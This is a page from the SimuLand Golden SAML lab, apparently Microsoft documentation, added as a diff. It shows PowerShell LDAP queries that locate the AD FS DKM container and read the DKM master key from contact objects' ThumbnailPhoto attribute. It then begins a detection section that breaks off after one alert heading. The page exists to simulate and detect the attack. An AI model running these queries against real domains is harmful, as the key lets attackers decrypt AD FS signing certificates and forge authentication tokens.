@@ -1,0 +1,892 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Export AD FS DKM Master Key via LDAP Queries &#8212; SimuLand</title>
+    
+  <link href="../../../../_static/css/theme.css" rel="stylesheet">
+  <link href="../../../../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="../../../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    
+      
+
+    
+    <link rel="stylesheet" href="../../../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
+    
+  <link rel="preload" as="script" href="../../../../_static/js/index.be7d3bbb2ef33a8344ce.js">
+
+    <script id="documentation_options" data-url_root="../../../../" src="../../../../_static/documentation_options.js"></script>
+    <script src="../../../../_static/jquery.js"></script>
+    <script src="../../../../_static/underscore.js"></script>
+    <script src="../../../../_static/doctools.js"></script>
+    <script src="../../../../_static/clipboard.min.js"></script>
+    <script src="../../../../_static/copybutton.js"></script>
+    <script >let toggleHintShow = 'Click to show';</script>
+    <script >let toggleHintHide = 'Click to hide';</script>
+    <script >let toggleOpenOnPrint = 'true';</script>
+    <script src="../../../../_static/togglebutton.js"></script>
+    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="../../../../_static/sphinx-book-theme.d59cb220de22ca1c485ebbdc042f0030.js"></script>
+    <script >const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"
+const thebe_selector = ".thebe,.cell"
+const thebe_selector_input = "pre"
+const thebe_selector_output = ".output, .cell_output"
+</script>
+    <script async="async" src="../../../../_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="../../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../../search.html" />
+    <link rel="next" title="Export AD FS DKM Master Key via Directory Replication Services" href="exportADFSDKMKeyDRS.html" />
+    <link rel="prev" title="Export AD FS DKM Master Key" href="README.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="../../../../index.html">
+      
+      
+      
+      <h1 class="site-logo" id="site-title">SimuLand</h1>
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="../../../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        <p class="caption">
+ <span class="caption-text">
+  Lab Environments
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../../../environments/_helper-docs/README.html">
+   Helper Docs
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
+  <label for="toctree-checkbox-1">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/addDomainToM365.html">
+     Add Domain to Microsoft 365 Tenant
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/addM365LicenseToUser.html">
+     Add Microsoft 365 E5 License to User
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/assignAADRole.html">
+     Assign Azure AD Role to User
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/configureAADConnectADFS.html">
+     Configure Azure AD Connect: ADFS
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/configureM365Defender.html">
+     Initialize Microsoft 365 Defenders Security Products Configurations
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/connectAzVmAzBastion.html">
+     Connect to Azure VM via Azure Bastion
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/createPrivateContainerUploadFile.html">
+     Create an Azure Storage Account and Host a Private File in a Private Container
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/disableAzureADFederation.html">
+     Disable Azure Active Directory (AD) Federation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/enableMultiFactorAuthentication.html">
+     Enable Multi-Factor Authentication
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/enableOffice365AuditLogSearch.html">
+     Enable Office 365 Audit Log Search
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/getTrustedCASignedSSLCertificate.html">
+     Create a Certificate Signing Request and Get a Trusted CA Signed SSL Certificate
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/m365TenantGetAzSubscription.html">
+     Microsoft 365 Tenant: Get an Azure Subscription
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/registerAADAppAndSP.html">
+     Register Azure AD Application and Create App Service Principal
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/_helper-docs/startM365E5Trial.html">
+     Start Microsoft 365 E5 Trial
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../../../environments/README.html">
+   Lab Environments
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
+  <label for="toctree-checkbox-2">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../../../environments/aadHybridIdentityADFS/README.html">
+     AAD Hybrid Identity: AD FS Environment
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+<p class="caption">
+ <span class="caption-text">
+  Lab Guides
+ </span>
+</p>
+<ul class="current nav bd-sidenav">
+ <li class="toctree-l1 current active has-children">
+  <a class="reference internal" href="../../README.html">
+   Golden SAML
+  </a>
+  <input checked="" class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
+  <label for="toctree-checkbox-3">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul class="current">
+   <li class="toctree-l2 has-children">
+    <a class="reference internal" href="../export-adfs-configuration/README.html">
+     Export AD FS Configuration
+    </a>
+    <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
+    <label for="toctree-checkbox-4">
+     <i class="fas fa-chevron-down">
+     </i>
+    </label>
+    <ul>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../export-adfs-configuration/exportADFSConfigLocalNamedPipe.html">
+       Export AD FS Configuration via a Local Named Pipe
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../export-adfs-configuration/exportADFSConfigWCFPolicyStore.html">
+       Export AD FS Configuration via Policy Store Transfer Service
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../export-adfs-configuration/exportADFSConfigDotNETReflection.html">
+       Export AD FS Configuration via .NET Reflection
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toctree-l2 current active has-children">
+    <a class="reference internal" href="README.html">
+     Export AD FS DKM Master Key
+    </a>
+    <input checked="" class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
+    <label for="toctree-checkbox-5">
+     <i class="fas fa-chevron-down">
+     </i>
+    </label>
+    <ul class="current">
+     <li class="toctree-l3 current active">
+      <a class="current reference internal" href="#">
+       Export AD FS DKM Master Key via LDAP Queries
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="exportADFSDKMKeyDRS.html">
+       Export AD FS DKM Master Key via Directory Replication Services
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toctree-l2 has-children">
+    <a class="reference internal" href="../export-adfs-certificates/README.html">
+     Export AD FS Certificates
+    </a>
+    <input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/>
+    <label for="toctree-checkbox-6">
+     <i class="fas fa-chevron-down">
+     </i>
+    </label>
+    <ul>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../export-adfs-certificates/exportADFSCertsDKMKey.html">
+       Export AD FS Certificates via DKM Master Key
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../export-adfs-certificates/exportADFSCertsDotNETReflection.html">
+       Export AD FS Certificates via .NET Reflection
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../sign-new-samltoken/README.html">
+     Forge SAML Tokens
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../get-oauth-accesstoken/README.html">
+     Get OAuth Access Token with SAML Assertion
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../read-mail-messages/README.html">
+     Read Mail Messages via MS Graph APIs
+    </a>
+   </li>
+  </ul>
+ </li>
+</ul>
+
+    </div>
+</nav> <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="topbar container-xl fixed-top">
+    <div class="topbar-contents row">
+        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
+        <div class="col pl-md-4 topbar-main">
+            
+            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+                <i class="fas fa-bars"></i>
+                <i class="fas fa-arrow-left"></i>
+                <i class="fas fa-arrow-up"></i>
+            </button>
+            
+            
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../../../../_sources/labs/GoldenSAML/simulation/export-adfs-dkm-key/exportADFSDKMKeyLDAP.md"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.md</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+                onclick="printPdf(this)" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+</div>
+
+            <!-- Source interaction buttons -->
+
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
+        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
+    <div class="dropdown-buttons sourcebuttons">
+        <a class="repository-button"
+            href="https://github.com/Azure/SimuLand"><button type="button" class="btn btn-secondary topbarbtn"
+                data-toggle="tooltip" data-placement="left" title="Source repository"><i
+                    class="fab fa-github"></i>repository</button></a>
+        <a class="issues-button"
+            href="https://github.com/Azure/SimuLand/issues/new?title=Issue%20on%20page%20%2Flabs/GoldenSAML/simulation/export-adfs-dkm-key/exportADFSDKMKeyLDAP.html&body=Your%20issue%20content%20here."><button
+                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
+                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
+        
+    </div>
+</div>
+
+            <!-- Full screen (wrap in <a> to have style consistency -->
+
+<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
+        title="Fullscreen mode"><i
+            class="fas fa-expand"></i></button></a>
+
+            <!-- Launch buttons -->
+
+        </div>
+
+        <!-- Table of contents -->
+        <div class="d-none d-md-block col-md-2 bd-toc show noprint">
+            
+            <div class="tocsection onthispage pt-5 pb-3">
+                <i class="fas fa-list"></i> Contents
+            </div>
+            <nav id="bd-toc-nav" aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#table-of-contents">
+   Table of Contents
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#preconditions">
+   Preconditions
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#simulation-steps">
+   Simulation Steps
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#get-path-of-ad-fs-dkm-container">
+     Get Path of AD FS DKM container
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#query-ldap">
+     Query LDAP
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#detection">
+   Detection
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#detect-ldap-query-with-thumbnailphoto-property-in-filter">
+     Detect LDAP Query with
+     <code class="docutils literal notranslate">
+      <span class="pre">
+       ThumbnailPhoto
+      </span>
+     </code>
+     Property in Filter
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#microsoft-defender-for-identity-alerts">
+       Microsoft Defender for Identity Alerts
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#microsoft-cloud-app-security-alerts">
+       Microsoft Cloud App Security Alerts
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#microsoft-defender-for-endpoint-alerts">
+       Microsoft Defender for Endpoint Alerts
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#detect-ldap-query-with-indirect-access-to-thumbnailphoto-property">
+     Detect LDAP Query with Indirect Access to
+     <code class="docutils literal notranslate">
+      <span class="pre">
+       ThumbnailPhoto
+      </span>
+     </code>
+     Property
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#id1">
+     Microsoft Defender for Endpoint Alerts
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#detect-access-to-ad-object">
+     Detect Access to AD Object
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#azure-sentinel-detection-rules">
+       Azure Sentinel Detection Rules
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#output">
+   Output
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#references">
+   References
+  </a>
+ </li>
+</ul>
+
+            </nav>
+        </div>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+            <!-- Table of contents that is only displayed when printing the page -->
+            <div id="jb-print-docs-body" class="onlyprint">
+                <h1>Export AD FS DKM Master Key via LDAP Queries</h1>
+                <!-- Table of contents -->
+                <div id="print-main-content">
+                    <div id="jb-print-toc">
+                        
+                        <div>
+                            <h2> Contents </h2>
+                        </div>
+                        <nav aria-label="Page">
+                            <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#table-of-contents">
+   Table of Contents
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#preconditions">
+   Preconditions
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#simulation-steps">
+   Simulation Steps
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#get-path-of-ad-fs-dkm-container">
+     Get Path of AD FS DKM container
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#query-ldap">
+     Query LDAP
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#detection">
+   Detection
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#detect-ldap-query-with-thumbnailphoto-property-in-filter">
+     Detect LDAP Query with
+     <code class="docutils literal notranslate">
+      <span class="pre">
+       ThumbnailPhoto
+      </span>
+     </code>
+     Property in Filter
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#microsoft-defender-for-identity-alerts">
+       Microsoft Defender for Identity Alerts
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#microsoft-cloud-app-security-alerts">
+       Microsoft Cloud App Security Alerts
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#microsoft-defender-for-endpoint-alerts">
+       Microsoft Defender for Endpoint Alerts
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#detect-ldap-query-with-indirect-access-to-thumbnailphoto-property">
+     Detect LDAP Query with Indirect Access to
+     <code class="docutils literal notranslate">
+      <span class="pre">
+       ThumbnailPhoto
+      </span>
+     </code>
+     Property
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#id1">
+     Microsoft Defender for Endpoint Alerts
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#detect-access-to-ad-object">
+     Detect Access to AD Object
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#azure-sentinel-detection-rules">
+       Azure Sentinel Detection Rules
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#output">
+   Output
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#references">
+   References
+  </a>
+ </li>
+</ul>
+
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            
+              <div>
+                
+  <div class="tex2jax_ignore mathjax_ignore section" id="export-ad-fs-dkm-master-key-via-ldap-queries">
+<h1>Export AD FS DKM Master Key via LDAP Queries<a class="headerlink" href="#export-ad-fs-dkm-master-key-via-ldap-queries" title="Permalink to this headline">¶</a></h1>
+<p>The path of the AD FS DKM container in the domain controller might vary, but it can be obtained from the <code class="docutils literal notranslate"><span class="pre">AD</span> <span class="pre">FS</span> <span class="pre">configuration</span> <span class="pre">settings</span></code>. After getting the AD path to the container, a threat actor can directly access the AD contact object and read the AD FS DKM master key value. One way to access and retrieve the DKM master key can be via LDAP queries.</p>
+<div class="section" id="table-of-contents">
+<h2>Table of Contents<a class="headerlink" href="#table-of-contents" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="#preconditions">Preconditions</a></p></li>
+<li><p><a class="reference external" href="#simulation-steps">Simulation Steps</a></p></li>
+<li><p><a class="reference external" href="#detection">Detection</a></p></li>
+<li><p><a class="reference external" href="#output">Output</a></p></li>
+<li><p><a class="reference external" href="#references">References</a></p></li>
+</ul>
+</div>
+<div class="section" id="preconditions">
+<h2>Preconditions<a class="headerlink" href="#preconditions" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>Integrity level: medium</p></li>
+<li><p>Authorization:</p>
+<ul>
+<li><p>Resource: AD FS Database</p>
+<ul>
+<li><p>Identity:</p>
+<ul>
+<li><p>AD FS Service Account</p></li>
+<li><p>Local Administrator</p></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Resource: AD FS DKM Container</p>
+<ul>
+<li><p>Identity:</p>
+<ul>
+<li><p>AD FS Service Account</p></li>
+<li><p>AD Domain Administrator</p></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Domain Controller:</p>
+<ul>
+<li><p>Services:</p>
+<ul>
+<li><p>Lightweight Directory Access Protocol (LDAP)</p></li>
+</ul>
+</li>
+<li><p>Network:</p>
+<ul>
+<li><p>Port: 389</p></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Input:</p>
+<ul>
+<li><p>AD FS Configuration Settings</p></li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="section" id="simulation-steps">
+<h2>Simulation Steps<a class="headerlink" href="#simulation-steps" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="get-path-of-ad-fs-dkm-container">
+<h3>Get Path of AD FS DKM container<a class="headerlink" href="#get-path-of-ad-fs-dkm-container" title="Permalink to this headline">¶</a></h3>
+<p>The AD FS DKM key value is stored in the <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> attribute of an AD contact object in the AD FS DKM container. Therefore, we first need to get the path of the AD FS DKM container in the AD domain controller. That information can be retrieved from the <code class="docutils literal notranslate"><span class="pre">AD</span> <span class="pre">FS</span> <span class="pre">configuration</span> <span class="pre">settings</span></code>.</p>
+<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="no">[xml]</span><span class="nv">$xml</span><span class="p">=</span><span class="nv">$settings</span>
+<span class="nv">$group</span> <span class="p">=</span> <span class="nv">$xml</span><span class="p">.</span><span class="n">ServiceSettingsData</span><span class="p">.</span><span class="n">PolicyStore</span><span class="p">.</span><span class="n">DkmSettings</span><span class="p">.</span><span class="nb">Group</span>
+<span class="nv">$container</span> <span class="p">=</span> <span class="nv">$xml</span><span class="p">.</span><span class="n">ServiceSettingsData</span><span class="p">.</span><span class="n">PolicyStore</span><span class="p">.</span><span class="n">DkmSettings</span><span class="p">.</span><span class="n">ContainerName</span>
+<span class="nv">$parent</span> <span class="p">=</span> <span class="nv">$xml</span><span class="p">.</span><span class="n">ServiceSettingsData</span><span class="p">.</span><span class="n">PolicyStore</span><span class="p">.</span><span class="n">DkmSettings</span><span class="p">.</span><span class="n">ParentContainerDn</span>
+<span class="nv">$base</span> <span class="p">=</span> <span class="s2">&quot;LDAP://CN=$group,$container,$parent&quot;</span>
+<span class="nv">$base</span>
+</pre></div>
+</div>
+<p><img alt="" src="../../../../_images/2021-05-19_13_get_ad_dkm_path.png" /></p>
+</div>
+<div class="section" id="query-ldap">
+<h3>Query LDAP<a class="headerlink" href="#query-ldap" title="Permalink to this headline">¶</a></h3>
+<p>We can use LDAP and create a query filtering on specific objects with the <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> attribute. We can then read the encryption key from the <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> attribute.</p>
+<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nv">$ADSearch</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.DirectorySearcher]</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="no">[System.DirectoryServices.DirectoryEntry]</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="nv">$base</span><span class="p">))</span>
+<span class="nv">$ADSearch</span><span class="p">.</span><span class="n">PropertiesToLoad</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;thumbnailphoto&quot;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nv">$ADSearch</span><span class="p">.</span><span class="k">Filter</span><span class="p">=</span><span class="s1">&#39;(&amp;(objectclass=contact)(!name=CryptoPolicy)(ThumbnailPhoto=*))&#39;</span>
+<span class="nv">$ADUser</span><span class="p">=</span><span class="nv">$ADSearch</span><span class="p">.</span><span class="n">FindOne</span><span class="p">()</span>
+<span class="nv">$key</span><span class="p">=</span><span class="no">[byte[]]</span><span class="nv">$aduser</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s2">&quot;thumbnailphoto&quot;</span><span class="p">][</span><span class="n">0</span><span class="p">]</span>
+<span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToString</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
+</pre></div>
+</div>
+<p><img alt="" src="../../../../_images/2021-05-19_14_ldap_thumbnailphoto_filter.png" /></p>
+<p>One could also filter on the <code class="docutils literal notranslate"><span class="pre">CryptoPolicy</span></code> contact object inside of the AD FS DKM container and get the value of its <code class="docutils literal notranslate"><span class="pre">DisplayName</span></code> attribute. This attribute refers to the <code class="docutils literal notranslate"><span class="pre">l</span></code> attribute of the right AD contact object that contains the DKM master key value. The DKM key is stored in its <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> attribute.</p>
+<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nv">$ADSearch</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.DirectorySearcher]</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="no">[System.DirectoryServices.DirectoryEntry]</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="nv">$base</span><span class="p">))</span>
+<span class="nv">$ADSearch</span><span class="p">.</span><span class="k">Filter</span> <span class="p">=</span> <span class="s1">&#39;(name=CryptoPolicy)&#39;</span>
+<span class="nv">$aduser</span> <span class="p">=</span> <span class="nv">$ADSearch</span><span class="p">.</span><span class="n">FindOne</span><span class="p">()</span>
+<span class="nv">$keyObjectGuid</span> <span class="p">=</span> <span class="nv">$ADUser</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s2">&quot;displayName&quot;</span><span class="p">]</span>
+<span class="nv">$ADSearch</span><span class="p">.</span><span class="n">PropertiesToLoad</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;thumbnailphoto&quot;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nv">$ADSearch</span><span class="p">.</span><span class="k">Filter</span><span class="p">=</span><span class="s2">&quot;(l=$keyObjectGuid)&quot;</span>
+<span class="nv">$aduser</span><span class="p">=</span><span class="nv">$ADSearch</span><span class="p">.</span><span class="n">FindOne</span><span class="p">()</span> 
+<span class="nv">$key</span><span class="p">=</span><span class="no">[byte[]]</span><span class="nv">$aduser</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s2">&quot;thumbnailphoto&quot;</span><span class="p">][</span><span class="n">0</span><span class="p">]</span>
+<span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToString</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
+</pre></div>
+</div>
+<p><img alt="" src="../../../../_images/2021-05-19_15_ldap_filter_cryptopolicy.png" /></p>
+</div>
+</div>
+<div class="section" id="detection">
+<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="detect-ldap-query-with-thumbnailphoto-property-in-filter">
+<h3>Detect LDAP Query with <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> Property in Filter<a class="headerlink" href="#detect-ldap-query-with-thumbnailphoto-property-in-filter" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="microsoft-defender-for-identity-alerts">
+<h4>Microsoft Defender for Identity Alerts<a class="headerlink" href="#microsoft-defender-for-identity-alerts" title="Permalink to this headline">¶</a></h4>
+<p><strong>Active Directory attributes Reconnaissance using LDAP</strong></p>
